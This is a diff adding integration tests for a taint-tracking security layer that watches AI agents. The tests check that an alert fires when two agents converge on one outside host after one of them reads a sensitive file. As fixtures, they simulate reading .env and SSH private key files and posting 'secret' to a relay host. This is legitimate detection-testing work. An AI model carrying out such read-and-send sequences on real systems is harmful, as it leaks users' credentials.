@@ -139,6 +139,68 @@ describe("Cross-principal taint propagation (integration)", () => {
 		expect(cp1Alerts).toHaveLength(0);
 	});
 
+	it("CP-3: two principals egressing to the same host with sensitive read fires convergence alert", async () => {
+		const fwA = registry.getOrCreate("agent-A");
+		const fwB = registry.getOrCreate("agent-B");
+
+		// Agent A reads a sensitive file
+		await secureExecute(fwA, "file", "read", { path: "/home/user/.env" });
+
+		// Agent A posts to relay.com
+		try {
+			await secureExecute(fwA, "http", "post", {
+				url: "https://relay.com/data",
+				body: "secret",
+			});
+		} catch {
+			// may be denied by behavioral rules — alert still fires from ingest
+		}
+
+		// Agent B fetches from the same relay.com host
+		await secureExecute(fwB, "http", "get", {
+			url: "https://relay.com/inbox",
+		});
+
+		const cp3Alerts = alerts.filter(
+			(a) => a.ruleId === "cross-principal-egress-convergence",
+		);
+		expect(cp3Alerts.length).toBeGreaterThanOrEqual(1);
+		expect(cp3Alerts[0].severity).toBe("high");
+		expect(cp3Alerts[0].principals).toContain("agent-A");
+		expect(cp3Alerts[0].principals).toContain("agent-B");
+		expect(cp3Alerts[0].reason).toContain("relay.com");
+	});
+
+	it("CP-3: no alert when principals egress to the same host without sensitive reads", async () => {
+		const fwA = registry.getOrCreate("agent-A");
+		const fwB = registry.getOrCreate("agent-B");
+
+		// Both agents hit the same host, but no sensitive reads
+		await secureExecute(fwA, "http", "get", { url: "https://api.example.com/data" });
+		await secureExecute(fwB, "http", "get", { url: "https://api.example.com/other" });
+
+		const cp3Alerts = alerts.filter(
+			(a) => a.ruleId === "cross-principal-egress-convergence",
+		);
+		expect(cp3Alerts).toHaveLength(0);
+	});
+
+	it("CP-3: no alert when only one principal egresses to a host", async () => {
+		const fwA = registry.getOrCreate("agent-A");
+
+		await secureExecute(fwA, "file", "read", { path: "/home/user/.ssh/id_rsa" });
+		try {
+			await secureExecute(fwA, "http", "post", { url: "https://relay.com/data" });
+		} catch {
+			// may be quarantined
+		}
+
+		const cp3Alerts = alerts.filter(
+			(a) => a.ruleId === "cross-principal-egress-convergence",
+		);
+		expect(cp3Alerts).toHaveLength(0);
+	});
+
 	it("Agent B gets derived-sensitive taint after reading contaminated shared store", async () => {
 		const fwA = registry.getOrCreate("agent-A");
 		const fwB = registry.getOrCreate("agent-B");
